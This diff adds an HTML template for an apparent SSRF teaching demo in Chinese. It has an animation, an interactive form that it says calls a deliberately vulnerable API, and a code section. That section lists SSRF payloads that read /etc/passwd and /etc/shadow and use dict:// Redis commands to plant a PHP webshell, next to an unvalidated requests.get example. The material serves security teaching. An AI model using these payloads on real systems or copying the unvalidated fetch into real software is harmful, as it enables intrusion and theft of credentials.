@@ -1,0 +1,1167 @@
+{% extends "base.html" %}
+
+{% block title %}SSRF攻击演示{% endblock %}
+
+{% block content %}
+<div class="card">
+    <h1><svg class="icon-sketch" viewBox="0 0 24 24" width="32" height="32"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z" fill="none" stroke="#f5f5f7" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg> SSRF服务器端请求伪造攻击</h1>
+
+    <h2>攻击原理</h2>
+    <p>SSRF（Server-Side Request Forgery，服务器端请求伪造）是指攻击者利用服务器端发起请求的功能，
+       让服务器访问攻击者指定的URL，从而实现对内网服务的探测、攻击或读取服务器本地文件。</p>
+
+    <h3>SSRF攻击条件</h3>
+    <ul style="margin-left: 2rem; margin-top: 0.5rem; line-height: 2;">
+        <li>服务器提供URL获取/预览功能</li>
+        <li>未对目标URL进行充分验证和过滤</li>
+        <li>服务器可以访问内网资源</li>
+        <li>支持file://、dict://、gopher://等协议</li>
+    </ul>
+
+    <h3>SSRF危害</h3>
+    <ul style="margin-left: 2rem; margin-top: 0.5rem; line-height: 2;">
+        <li>探测内网服务（Redis、Memcached、数据库等）</li>
+        <li>读取服务器本地文件（/etc/passwd、配置文件等）</li>
+        <li>攻击内网其他服务（未授权访问）</li>
+        <li>端口扫描内网主机</li>
+        <li>配合Redis等服务实现远程代码执行</li>
+    </ul>
+</div>
+
+<div class="card">
+    <h2><svg class="icon-sketch" viewBox="0 0 24 24" width="24" height="24"><circle cx="12" cy="12" r="10" fill="none" stroke="#f5f5f7" stroke-width="1.5"/><circle cx="12" cy="12" r="6" fill="none" stroke="#f5f5f7" stroke-width="1.5"/><circle cx="12" cy="12" r="2" fill="#34c759"/></svg> SSRF攻击动画演示</h2>
+    <p>点击下方按钮开始动画演示，观察SSRF攻击如何利用服务器访问内网资源：</p>
+
+    <div class="animation-controls">
+        <button id="startBtn" class="btn btn-danger" onclick="startAttack()">
+            ▶ 开始攻击演示
+        </button>
+        <button id="stopBtn" class="btn btn-warning" onclick="stopAttack()" disabled>
+            ⏹ 停止演示
+        </button>
+        <button id="resetBtn" class="btn btn-info" onclick="resetAnimation()">
+            ↺ 重置
+        </button>
+    </div>
+
+    <div class="animation-container">
+        <canvas id="ssrfCanvas" width="900" height="500"></canvas>
+    </div>
+
+    <!-- 攻击状态指示 -->
+    <div class="attack-status" id="attackStatus">
+        <div class="status-indicator">
+            <span class="status-dot green"></span>
+            <span class="status-text">攻击状态: <strong id="statusText">待开始</strong></span>
+        </div>
+        <div class="phase-info">
+            当前阶段: <strong id="phaseText">--</strong>
+        </div>
+    </div>
+
+    <div class="stats-panel">
+        <h3>📊 实时攻击统计</h3>
+        <div class="stats-grid">
+            <div class="stat-item">
+                <div class="stat-label">攻击请求</div>
+                <div class="stat-value" id="statRequests">0</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-label">内网服务</div>
+                <div class="stat-value" id="statServices">0</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-label">读取文件</div>
+                <div class="stat-value" id="statFiles">0</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-label">成功攻击</div>
+                <div class="stat-value danger" id="statSuccess">0</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="alert alert-warning">
+        <strong>⚠️ 说明：</strong>本演示使用纯前端动画模拟攻击过程，不会产生真实网络请求。
+        所有数据均为模拟数据，仅用于教学目的。
+    </div>
+</div>
+
+<div class="card">
+    <h2><svg class="icon-sketch" viewBox="0 0 24 24" width="24" height="24"><path d="M22.7 19l-9.1-9.1c.9-2.3.4-5-1.5-6.9-2-2-5-2.4-7.4-1.3L9 6 6 9 1.6 4.7C.4 7.1.9 10.1 2.9 12.1c1.9 1.9 4.6 2.4 6.9 1.5l9.1 9.1c.4.4 1 .4 1.4 0l2.3-2.3c.5-.4.5-1.1.1-1.4z" fill="none" stroke="#f5f5f7" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg> 交互式SSRF演示</h2>
+    <p>这是一个<strong>真实存在SSRF漏洞</strong>的API，你可以亲自操作发起请求：</p>
+
+    <div class="ssrf-demo">
+        <div class="form-group">
+            <label for="targetUrl">输入目标URL：</label>
+            <div style="display: flex; gap: 1rem;">
+                <input type="text" id="targetUrl" placeholder="例如: http://127.0.0.1:6379 或 file:///etc/passwd" style="flex: 1;">
+                <button class="btn btn-danger" onclick="sendSSRFRequest()"><svg class="icon-sketch" viewBox="0 0 24 24" width="16" height="16"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg> 发送请求</button>
+            </div>
+        </div>
+
+        <div class="attack-scenarios">
+            <h3><svg class="icon-sketch" viewBox="0 0 24 24" width="20" height="20"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z" fill="none" stroke="#f5f5f7" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg> 项目文件读取</h3>
+            <div class="scenario-grid">
+                <div class="scenario-card" onclick="setUrl('file:///D:/attack_test/attack_demo/app.py')">
+                    <h4><svg class="icon-sketch" viewBox="0 0 24 24" width="16" height="16"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><polyline points="14 2 14 8 20 8" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg> 读取app.py</h4>
+                    <p>读取Flask主程序源码</p>
+                    <code>file:///D:/attack_test/attack_demo/app.py</code>
+                </div>
+                <div class="scenario-card" onclick="setUrl('file:///D:/attack_test/attack_demo/templates/index.html')">
+                    <h4><svg class="icon-sketch" viewBox="0 0 24 24" width="16" height="16"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><polyline points="14 2 14 8 20 8" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg> 读取首页模板</h4>
+                    <p>读取index.html模板</p>
+                    <code>file:///D:/attack_test/attack_demo/templates/index.html</code>
+                </div>
+                <div class="scenario-card" onclick="setUrl('file:///D:/attack_test/attack_demo/static/css/style.css')">
+                    <h4><svg class="icon-sketch" viewBox="0 0 24 24" width="16" height="16"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><polyline points="14 2 14 8 20 8" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg> 读取CSS样式</h4>
+                    <p>读取样式表文件</p>
+                    <code>file:///D:/attack_test/attack_demo/static/css/style.css</code>
+                </div>
+                <div class="scenario-card" onclick="setUrl('file:///D:/attack_test/attack_demo/requirements.txt')">
+                    <h4><svg class="icon-sketch" viewBox="0 0 24 24" width="16" height="16"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><polyline points="14 2 14 8 20 8" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg> 读取依赖文件</h4>
+                    <p>读取requirements.txt</p>
+                    <code>file:///D:/attack_test/attack_demo/requirements.txt</code>
+                </div>
+            </div>
+        </div>
+
+        <div class="attack-scenarios">
+            <h3><svg class="icon-sketch" viewBox="0 0 24 24" width="20" height="20"><circle cx="12" cy="12" r="10" fill="none" stroke="#f5f5f7" stroke-width="1.5"/><circle cx="12" cy="12" r="6" fill="none" stroke="#f5f5f7" stroke-width="1.5"/><circle cx="12" cy="12" r="2" fill="#34c759"/></svg> 模拟内网服务攻击</h3>
+            <div class="scenario-grid">
+                <div class="scenario-card" onclick="setUrl('http://127.0.0.1:16379')">
+                    <h4><svg class="icon-sketch" viewBox="0 0 24 24" width="16" height="16"><circle cx="12" cy="12" r="10" fill="none" stroke="#cf222e" stroke-width="1.5"/><line x1="12" y1="8" x2="12" y2="12" stroke="#cf222e" stroke-width="1.5" stroke-linecap="round"/><line x1="12" y1="16" x2="12.01" y2="16" stroke="#cf222e" stroke-width="2" stroke-linecap="round"/></svg> Redis服务</h4>
+                    <p>模拟Redis信息泄露</p>
+                    <code>http://127.0.0.1:16379</code>
+                </div>
+                <div class="scenario-card" onclick="setUrl('http://127.0.0.1:13306')">
+                    <h4><svg class="icon-sketch" viewBox="0 0 24 24" width="16" height="16"><circle cx="12" cy="12" r="10" fill="none" stroke="#cf222e" stroke-width="1.5"/><line x1="12" y1="8" x2="12" y2="12" stroke="#cf222e" stroke-width="1.5" stroke-linecap="round"/><line x1="12" y1="16" x2="12.01" y2="16" stroke="#cf222e" stroke-width="2" stroke-linecap="round"/></svg> MySQL服务</h4>
+                    <p>模拟MySQL信息泄露</p>
+                    <code>http://127.0.0.1:13306</code>
+                </div>
+                <div class="scenario-card" onclick="setUrl('http://127.0.0.1:18080')">
+                    <h4><svg class="icon-sketch" viewBox="0 0 24 24" width="16" height="16"><circle cx="12" cy="12" r="10" fill="none" stroke="#cf222e" stroke-width="1.5"/><line x1="12" y1="8" x2="12" y2="12" stroke="#cf222e" stroke-width="1.5" stroke-linecap="round"/><line x1="12" y1="16" x2="12.01" y2="16" stroke="#cf222e" stroke-width="2" stroke-linecap="round"/></svg> 内网管理后台</h4>
+                    <p>访问内部管理系统</p>
+                    <code>http://127.0.0.1:18080</code>
+                </div>
+                <div class="scenario-card" onclick="setUrl('http://127.0.0.1:18080/api/users')">
+                    <h4><svg class="icon-sketch" viewBox="0 0 24 24" width="16" height="16"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><circle cx="12" cy="7" r="4" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg> 用户数据泄露</h4>
+                    <p>获取用户密码信息</p>
+                    <code>http://127.0.0.1:18080/api/users</code>
+                </div>
+                <div class="scenario-card" onclick="setUrl('http://127.0.0.1:18080/api/config')">
+                    <h4><svg class="icon-sketch" viewBox="0 0 24 24" width="16" height="16"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg> 配置信息泄露</h4>
+                    <p>获取数据库密码/API密钥</p>
+                    <code>http://127.0.0.1:18080/api/config</code>
+                </div>
+                <div class="scenario-card" onclick="setUrl('http://127.0.0.1:18080/api/server')">
+                    <h4><svg class="icon-sketch" viewBox="0 0 24 24" width="16" height="16"><rect x="2" y="3" width="20" height="14" rx="2" ry="2" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><line x1="8" y1="21" x2="16" y2="21" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><line x1="12" y1="17" x2="12" y2="21" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg> 服务器信息</h4>
+                    <p>获取服务器配置信息</p>
+                    <code>http://127.0.0.1:18080/api/server</code>
+                </div>
+                <div class="scenario-card" onclick="setUrl('http://127.0.0.1:19200')">
+                    <h4><svg class="icon-sketch" viewBox="0 0 24 24" width="16" height="16"><circle cx="12" cy="12" r="10" fill="none" stroke="#cf222e" stroke-width="1.5"/><line x1="12" y1="8" x2="12" y2="12" stroke="#cf222e" stroke-width="1.5" stroke-linecap="round"/><line x1="12" y1="16" x2="12.01" y2="16" stroke="#cf222e" stroke-width="2" stroke-linecap="round"/></svg> Elasticsearch</h4>
+                    <p>模拟ES信息泄露</p>
+                    <code>http://127.0.0.1:19200</code>
+                </div>
+                <div class="scenario-card" onclick="setUrl('http://127.0.0.1:19200/_cat/indices')">
+                    <h4><svg class="icon-sketch" viewBox="0 0 24 24" width="16" height="16"><line x1="18" y1="20" x2="18" y2="10" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><line x1="12" y1="20" x2="12" y2="4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><line x1="6" y1="20" x2="6" y2="14" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg> ES索引列表</h4>
+                    <p>查看所有数据索引</p>
+                    <code>http://127.0.0.1:19200/_cat/indices</code>
+                </div>
+            </div>
+        </div>
+
+        <div class="custom-payload">
+            <h3><svg class="icon-sketch" viewBox="0 0 24 24" width="20" height="20"><polyline points="16 18 22 12 16 6" fill="none" stroke="#9a6700" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><polyline points="8 6 2 12 8 18" fill="none" stroke="#9a6700" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg> 自定义Payload</h3>
+            <p>尝试构造不同的攻击Payload：</p>
+            <div class="payload-input">
+                <input type="text" id="customPayload" placeholder="输入自定义URL..." style="flex: 1;">
+                <button class="btn btn-warning" onclick="sendCustomPayload()"><svg class="icon-sketch" viewBox="0 0 24 24" width="16" height="16"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg> 发送自定义Payload</button>
+            </div>
+            <div class="payload-tips">
+                <p><strong>提示：</strong></p>
+                <ul>
+                    <li><code>http://127.0.0.1:端口</code> - 探测本机服务</li>
+                    <li><code>file:///路径</code> - 读取本地文件</li>
+                    <li><code>http://内网IP:端口</code> - 探测内网服务</li>
+                </ul>
+            </div>
+        </div>
+
+        <div id="requestInfo" class="request-info" style="display: none;">
+            <h3><svg class="icon-sketch" viewBox="0 0 24 24" width="20" height="20"><line x1="22" y1="2" x2="11" y2="13" stroke="#f5f5f7" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><polygon points="22 2 15 22 11 13 2 9 22 2" fill="none" stroke="#f5f5f7" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg> 请求信息</h3>
+            <div id="requestDetails" class="code-block"></div>
+        </div>
+
+        <div id="ssrfResult" class="result-box" style="display: none;">
+            <h3><svg class="icon-sketch" viewBox="0 0 24 24" width="20" height="20"><polyline points="22 12 16 12 14 15 10 9 8 12 2 12" fill="none" stroke="#f5f5f7" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg> 响应结果</h3>
+            <div id="resultContent"></div>
+        </div>
+
+        <div id="attackAnalysis" class="attack-analysis" style="display: none;">
+            <h3><svg class="icon-sketch" viewBox="0 0 24 24" width="20" height="20"><circle cx="11" cy="11" r="8" fill="none" stroke="#cf222e" stroke-width="1.5"/><line x1="21" y1="21" x2="16.65" y2="16.65" stroke="#cf222e" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg> 攻击分析</h3>
+            <div id="analysisContent"></div>
+        </div>
+    </div>
+</div>
+
+<div class="card">
+    <h2><svg class="icon-sketch" viewBox="0 0 24 24" width="24" height="24"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7" fill="none" stroke="#f5f5f7" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z" fill="none" stroke="#f5f5f7" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg> 攻击代码分析</h2>
+
+    <h3>漏洞代码示例</h3>
+    <div class="code-block">
+        <pre>
+# 危险的URL预览功能 - 存在SSRF漏洞
+@app.route('/preview')
+def preview_url():
+    url = request.args.get('url')
+
+    # 危险：直接使用用户提供的URL发起请求
+    # 没有验证URL是否为内网地址
+    # 没有限制可访问的协议
+    response = requests.get(url)
+
+    return response.text
+
+# 攻击者可以构造以下请求：
+# /preview?url=http://127.0.0.1:6379/     -> 访问内网Redis
+# /preview?url=file:///etc/passwd          -> 读取本地文件
+# /preview?url=http://192.168.1.1/admin    -> 访问内网管理界面
+        </pre>
+    </div>
+
+    <h3>SSRF利用方式</h3>
+    <div class="code-block">
+        <pre>
+# 1. 探测内网服务
+http://target.com/fetch?url=http://127.0.0.1:6379    # Redis
+http://target.com/fetch?url=http://127.0.0.1:3306    # MySQL
+http://target.com/fetch?url=http://127.0.0.1:27017   # MongoDB
+http://target.com/fetch?url=http://192.168.1.1:8080  # 内网Web
+
+# 2. 读取本地文件
+http://target.com/fetch?url=file:///etc/passwd
+http://target.com/fetch?url=file:///etc/shadow
+http://target.com/fetch?url=file:///proc/self/environ
+
+# 3. 端口扫描
+http://target.com/fetch?url=http://127.0.0.1:80
+http://target.com/fetch?url=http://127.0.0.1:443
+http://target.com/fetch?url=http://127.0.0.1:8080
+
+# 4. 配合Redis实现RCE
+http://target.com/fetch?url=dict://127.0.0.1:6379/config:set:dir:/var/www/html
+http://target.com/fetch?url=dict://127.0.0.1:6379/config:set:dbfilename:shell.php
+http://target.com/fetch?url=dict://127.0.0.1:6379/set:webshell:&lt;?php system($_GET[cmd]);?&gt;
+http://target.com/fetch?url=dict://127.0.0.1:6379/save
+        </pre>
+    </div>
+</div>
+
+<div class="card">
+    <h2><svg class="icon-sketch" viewBox="0 0 24 24" width="24" height="24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" fill="none" stroke="#f5f5f7" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg> 防御方法</h2>
+    <a href="/defense/ssrf" class="btn btn-info">查看SSRF防御方法</a>
+</div>
+
+<style>
+    .animation-controls {
+        display: flex;
+        gap: 0.75rem;
+        margin: 1.5rem 0;
+    }
+
+    .animation-container {
+        background-color: rgba(0, 0, 0, 0.3);
+        border-radius: 16px;
+        padding: 1.5rem;
+        margin: 1.5rem 0;
+        text-align: center;
+        border: 1px solid rgba(255, 255, 255, 0.08);
+    }
+
+    #ssrfCanvas {
+        max-width: 100%;
+        border-radius: 12px;
+    }
+
+    .attack-status {
+        display: flex;
+        justify-content: space-around;
+        background-color: rgba(0, 0, 0, 0.3);
+        border-radius: 12px;
+        padding: 1rem;
+        margin: 1rem 0;
+        border: 1px solid rgba(255, 255, 255, 0.08);
+    }
+
+    .status-indicator {
+        display: flex;
+        align-items: center;
+        gap: 0.625rem;
+    }
+
+    .status-dot {
+        width: 10px;
+        height: 10px;
+        border-radius: 50%;
+        display: inline-block;
+        animation: pulse 1.5s infinite;
+    }
+
+    .status-dot.green {
+        background-color: #34c759;
+    }
+
+    .status-dot.yellow {
+        background-color: #ff9f0a;
+    }
+
+    .status-dot.red {
+        background-color: #ff3b30;
+    }
+
+    @keyframes pulse {
+        0%, 100% { opacity: 1; }
+        50% { opacity: 0.5; }
+    }
+
+    .status-text, .phase-info {
+        color: #a1a1a6;
+        font-size: 0.875rem;
+    }
+
+    .status-text strong, .phase-info strong {
+        color: #f5f5f7;
+    }
+
+    .stats-panel {
+        background-color: rgba(0, 0, 0, 0.3);
+        border-radius: 12px;
+        padding: 1.25rem;
+        margin-top: 1rem;
+        border: 1px solid rgba(255, 255, 255, 0.08);
+    }
+
+    .stats-panel h3 {
+        color: #f5f5f7;
+        margin-bottom: 1rem;
+        font-size: 1.125rem;
+        font-weight: 600;
+    }
+
+    .stats-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+        gap: 1rem;
+    }
+
+    .stat-item {
+        background-color: rgba(255, 255, 255, 0.05);
+        border-radius: 12px;
+        padding: 1rem;
+        text-align: center;
+        border: 1px solid rgba(255, 255, 255, 0.08);
+    }
+
+    .stat-label {
+        color: #a1a1a6;
+        font-size: 0.75rem;
+        margin-bottom: 0.375rem;
+    }
+
+    .stat-value {
+        color: #f5f5f7;
+        font-size: 1.75rem;
+        font-weight: 600;
+        font-family: "SF Mono", "Fira Code", monospace;
+        letter-spacing: -0.02em;
+    }
+
+    .stat-value.danger {
+        color: #ff3b30;
+    }
+
+    button:disabled {
+        opacity: 0.4;
+        cursor: not-allowed;
+    }
+
+    .ssrf-demo {
+        margin-top: 1.5rem;
+    }
+
+    .quick-urls {
+        margin: 1rem 0;
+        display: flex;
+        flex-wrap: wrap;
+        gap: 0.625rem;
+        align-items: center;
+    }
+
+    .quick-urls p {
+        margin: 0;
+        color: #a1a1a6;
+    }
+
+    .btn-sm {
+        padding: 0.5rem 1rem;
+        font-size: 0.8125rem;
+    }
+
+    .result-box {
+        background-color: rgba(0, 0, 0, 0.3);
+        border-radius: 12px;
+        padding: 1.25rem;
+        margin-top: 1rem;
+        font-family: "SF Mono", "Fira Code", monospace;
+        font-size: 0.875rem;
+        white-space: pre-wrap;
+        word-wrap: break-word;
+        max-height: 400px;
+        overflow-y: auto;
+        line-height: 1.7;
+        border: 1px solid rgba(255, 255, 255, 0.08);
+    }
+
+    .result-success {
+        border-left: 3px solid #34c759;
+    }
+
+    .result-error {
+        border-left: 3px solid #ff3b30;
+    }
+
+    .result-warning {
+        border-left: 3px solid #ff9f0a;
+    }
+
+    .attack-phase {
+        background-color: rgba(255, 59, 48, 0.1);
+        border: 1px solid rgba(255, 59, 48, 0.3);
+        border-radius: 12px;
+        padding: 1rem;
+        margin: 1rem 0;
+        text-align: center;
+        color: #ff3b30;
+    }
+
+    .attack-phase.active {
+        animation: flashBorder 1s infinite;
+    }
+
+    @keyframes flashBorder {
+        0%, 100% { border-color: rgba(255, 59, 48, 0.3); }
+        50% { border-color: #ff3b30; }
+    }
+
+    .attack-scenarios {
+        margin: 2rem 0;
+    }
+
+    .attack-scenarios h3 {
+        color: #f5f5f7;
+        margin-bottom: 1rem;
+        font-size: 1.25rem;
+        font-weight: 600;
+    }
+
+    .scenario-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+        gap: 1rem;
+    }
+
+    .scenario-card {
+        background-color: rgba(255, 255, 255, 0.05);
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        border-radius: 14px;
+        padding: 1.25rem;
+        cursor: pointer;
+        transition: all 0.3s cubic-bezier(0.25, 0.1, 0.25, 1);
+    }
+
+    .scenario-card:hover {
+        border-color: rgba(41, 151, 255, 0.5);
+        background-color: rgba(41, 151, 255, 0.05);
+        transform: scale(1.02);
+    }
+
+    .scenario-card h4 {
+        color: #f5f5f7;
+        margin-bottom: 0.5rem;
+        font-size: 0.9375rem;
+        font-weight: 600;
+    }
+
+    .scenario-card p {
+        color: #a1a1a6;
+        font-size: 0.8125rem;
+        margin-bottom: 0.625rem;
+    }
+
+    .scenario-card code {
+        background-color: rgba(255, 255, 255, 0.06);
+        padding: 0.25rem 0.5rem;
+        border-radius: 8px;
+        font-size: 0.6875rem;
+        color: #a1a1a6;
+        display: block;
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        max-width: 100%;
+        font-family: "SF Mono", "Fira Code", monospace;
+    }
+
+    .custom-payload {
+        margin: 2rem 0;
+        padding: 1.5rem;
+        background-color: rgba(255, 159, 10, 0.08);
+        border: 1px solid rgba(255, 159, 10, 0.2);
+        border-radius: 14px;
+    }
+
+    .custom-payload h3 {
+        color: #ff9f0a;
+        margin-bottom: 0.75rem;
+        font-size: 1.125rem;
+        font-weight: 600;
+    }
+
+    .payload-input {
+        display: flex;
+        gap: 0.75rem;
+        margin: 1rem 0;
+    }
+
+    .payload-tips {
+        margin-top: 1rem;
+        color: #a1a1a6;
+        font-size: 0.875rem;
+    }
+
+    .payload-tips ul {
+        margin-left: 1.5rem;
+        margin-top: 0.5rem;
+    }
+
+    .payload-tips code {
+        background-color: rgba(255, 255, 255, 0.06);
+        padding: 0.125rem 0.375rem;
+        border-radius: 6px;
+        font-size: 0.8125rem;
+    }
+
+    .request-info {
+        margin: 1.5rem 0;
+    }
+
+    .request-info h3 {
+        color: #f5f5f7;
+        margin-bottom: 0.75rem;
+        font-size: 1.125rem;
+        font-weight: 600;
+    }
+
+    .response-content {
+        background-color: rgba(0, 0, 0, 0.3);
+        border-radius: 10px;
+        padding: 1rem;
+        margin-top: 0.75rem;
+        max-height: 300px;
+        overflow-y: auto;
+        white-space: pre-wrap;
+        word-wrap: break-word;
+        border: 1px solid rgba(255, 255, 255, 0.08);
+    }
+
+    .attack-analysis {
+        margin: 1.5rem 0;
+    }
+
+    .attack-analysis h3 {
+        color: #ff3b30;
+        margin-bottom: 0.75rem;
+        font-size: 1.125rem;
+        font-weight: 600;
+    }
+
+    .icon-sketch {
+        vertical-align: middle;
+        margin-right: 0.375rem;
+    }
+
+    svg.icon-sketch {
+        display: inline-block;
+        vertical-align: middle;
+    }
+
+    .attack-failure-analysis {
+        margin: 2rem 0;
+        padding: 1.25rem;
+        background-color: rgba(255, 59, 48, 0.08);
+        border: 1px solid rgba(255, 59, 48, 0.2);
+        border-radius: 14px;
+    }
+
+    .attack-failure-analysis h3 {
+        color: #ff3b30;
+        margin-bottom: 1rem;
+        font-size: 1.125rem;
+        font-weight: 600;
+    }
+
+    .failure-reasons {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+        gap: 0.75rem;
+    }
+
+    .reason-card {
+        background: rgba(0, 0, 0, 0.2);
+        border-radius: 8px;
+        padding: 1rem;
+        border-left: 3px solid #ff4444;
+    }
+
+    .reason-card h4 {
+        color: #ff6666;
+        margin-bottom: 0.5rem;
+        font-size: 0.95rem;
+    }
+
+    .reason-card p {
+        color: rgba(255, 255, 255, 0.7);
+        font-size: 0.9rem;
+        margin-bottom: 0.5rem;
+    }
+
+    .reason-card strong {
+        color: #ffaa00;
+    }
+</style>
+
+<script>
+// SSRF动画相关变量
+let animationId = null;
+let isRunning = false;
+let attackPhase = 0; // 0: 待开始, 1: 探测内网, 2: 读取文件, 3: 攻击服务
+let attackRequests = [];
+let servicesFound = 0;
+let filesRead = 0;
+let successfulAttacks = 0;
+let animationFrame = 0;
+
+// Canvas相关
+const canvas = document.getElementById('ssrfCanvas');
+const ctx = canvas.getContext('2d');
+
+// 节点位置
+const nodes = {
+    attacker: { x: 100, y: 250, label: '攻击者', color: '#ff4444' },
+    server: { x: 450, y: 250, label: 'Web服务器', color: '#00ccff' },
+    internal: [
+        { x: 700, y: 100, label: 'Redis (6379)', color: '#ff6600', port: 6379 },
+        { x: 700, y: 200, label: 'MySQL (3306)', color: '#0066cc', port: 3306 },
+        { x: 700, y: 300, label: '内网Web (80)', color: '#00cc66', port: 80 },
+        { x: 700, y: 400, label: 'MongoDB (27017)', color: '#33cc33', port: 27017 }
+    ],
+    fileSystem: { x: 450, y: 450, label: '文件系统', color: '#ffaa00' }
+};
+
+/**
+ * 绘制背景
+ */
+function drawBackground() {
+    // 网格效果
+    ctx.strokeStyle = 'rgba(255, 255, 255, 0.05)';
+    ctx.lineWidth = 1;
+
+    for (let x = 0; x < canvas.width; x += 50) {
+        ctx.beginPath();
+        ctx.moveTo(x, 0);
+        ctx.lineTo(x, canvas.height);
+        ctx.stroke();
+    }
+
+    for (let y = 0; y < canvas.height; y += 50) {
+        ctx.beginPath();
+        ctx.moveTo(0, y);
+        ctx.lineTo(canvas.width, y);
+        ctx.stroke();
+    }
+
+    // 内网区域标识
+    ctx.strokeStyle = 'rgba(255, 68, 68, 0.3)';
+    ctx.lineWidth = 2;
+    ctx.setLineDash([10, 5]);
+    ctx.strokeRect(620, 50, 260, 400);
+    ctx.setLineDash([]);
+
+    ctx.fillStyle = 'rgba(255, 68, 68, 0.8)';
+    ctx.font = '14px Arial';
+    ctx.textAlign = 'center';
+    ctx.fillText('内网环境 (192.168.x.x)', 750, 30);
+
+    // 文件系统区域
+    ctx.strokeStyle = 'rgba(255, 170, 0, 0.3)';
+    ctx.setLineDash([10, 5]);
+    ctx.strokeRect(350, 420, 200, 70);
+    ctx.setLineDash([]);
+
+    ctx.fillStyle = 'rgba(255, 170, 0, 0.8)';
+    ctx.font = '12px Arial';
+    ctx.fillText('本地文件系统', 450, 415);
+}
+
+/**
+ * 绘制节点
+ */
+function drawNode(node, radius = 25) {
+    // 节点圆圈
+    ctx.beginPath();
+    ctx.arc(node.x, node.y, radius, 0, Math.PI * 2);
+    ctx.fillStyle = node.color + '40';
+    ctx.fill();
+    ctx.strokeStyle = node.color;
+    ctx.lineWidth = 2;
+    ctx.stroke();
+
+    // 节点图标
+    ctx.font = '24px Arial';
+    ctx.textAlign = 'center';
+    ctx.fillStyle = '#fff';
+    if (node === nodes.attacker) {
+        ctx.fillText('👤', node.x, node.y + 8);
+    } else if (node === nodes.server) {
+        ctx.fillText('🖥️', node.x, node.y + 8);
+    } else if (node === nodes.fileSystem) {
+        ctx.fillText('📁', node.x, node.y + 8);
+    }
+
+    // 节点标签
+    ctx.font = '12px Arial';
